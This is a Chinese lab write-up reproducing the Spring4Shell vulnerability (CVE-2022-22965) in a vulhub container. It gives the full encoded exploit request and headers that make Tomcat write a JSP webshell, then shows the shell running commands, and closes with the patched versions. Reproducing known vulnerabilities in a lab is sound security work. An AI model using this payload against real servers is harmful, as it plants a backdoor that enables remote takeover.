### 漏洞分析：

看过有大佬分析发现，这个Spring最新0day漏洞其实不是全新的那种新洞，而是CVE-2010-1622这个漏洞的一种绕过情况。

​ 这个CVE-2010-1622漏洞的原因是Spring参数绑定时，可以注入一个Java
pojo对象，这个对象可以是恶意的去注册一些敏感tomcat的属性，最后通过修改Tomcat的配置参数执行危险操作。

​ 所以最新的CVE-2022-22965漏洞就是绕过了这个限制，可以说是Java
9的环境下坑了Spring一把，JDK9中存在可以绕过黑名单禁用的类，导致了这个漏洞，最后利用方式也就和之前一样了。通过请求传入的参数，利用SpringMVC参数绑定机制，控制了Tomcat
AccessLogValve的属性，让Tomcat在webapps/ROOT目录输出定制的“访问日志”tomcatwar.jsp，该“访问日志”实际上为一个JSP
webshell。

### 利用条件：

使用JDK9及以上版本

使用Apache Tomcat作为容器

使用了传统的WAR包部署方式

依赖了spring-wemvc以及springwebflux

Spring Framework版本为5.3.0到5.3.17，5.2.0到5.2.19以及其他老版本

### 复现过程：

本次复习的环境是用vulhub上的，docker直接拉起。

![1652583417_62806bf962dfdc6a18932.png!small?1652583417537](https://image.3001.net/images/20220515/1652583417_62806bf962dfdc6a18932.png!small?1652583417537)

拉起后docker ps查看端口号并去访问页面

![1652583481_62806c39b647d31aafdda.png!small?1652583483593](https://image.3001.net/images/20220515/1652583481_62806c39b647d31aafdda.png!small?1652583483593)

构造恶意的请求地址

![1652583490_62806c42bcdd3d725544d.png!small?1652583490958](https://image.3001.net/images/20220515/1652583490_62806c42bcdd3d725544d.png!small?1652583490958)

> `Poc:`
>
>
> `?﻿``class``.module.classLoader.resources.context.parent.pipeline.first.pattern=%``25``%7Bc2%7Di%20if(%22j%``22``.equals(request.getParameter(%22pwd%``22``)))%7B%20java.io.InputStream%20in%``20``%3D%``20``%``25``%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%``22``)).getInputStream()%3B%20int%20a%``20``%3D%``20``-``1``%3B%20byte%5B%5D%20b%``20``%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-``1``)%7B%20out.println(``new``%20String(b))%3B%``20``%7D%``20``%7D%``20``%``25``%7Bsuffix%7Di&``class``.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&``class``.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&``class``.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&``class``.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`

打开bp抓取请求包

![1652583566_62806c8e37385aee1961b.png!small?1652583568027](https://image.3001.net/images/20220515/1652583566_62806c8e37385aee1961b.png!small?1652583568027)

修改请求头为：

> suffix: %>//
>
> c1: Runtime
>
> c2: <%
>
> DNT: 1
>
> Content-Length: 2

![1652583587_62806ca3106e703e09a05.png!small?1652583588252](https://image.3001.net/images/20220515/1652583587_62806ca3106e703e09a05.png!small?1652583588252)

可以打开靶机进入到容器里在/tomcat/webapps/ROOT目录下查看到tomcatwar.jsp文件成功被写入

![1652583605_62806cb5cdbcebca22975.png!small?1652583606324](https://image.3001.net/images/20220515/1652583605_62806cb5cdbcebca22975.png!small?1652583606324)

访问地址

[ _http://192.168.74.185:8080/tomcatwar.jsp?pwd=j
&cmd=whoami_](http://192.168.74.185:8080/tomcatwar.jsp?pwd=j&cmd=whoami)

![1652583618_62806cc2da281b37aa284.png!small?1652583619676](https://image.3001.net/images/20220515/1652583618_62806cc2da281b37aa284.png!small?1652583619676)

成功执行命令

### 漏洞修复：

目前官方已发布新版本5.2.20.RELEASE与5.3.18修复此漏洞，请受影响的用户尽快更新进行防护。

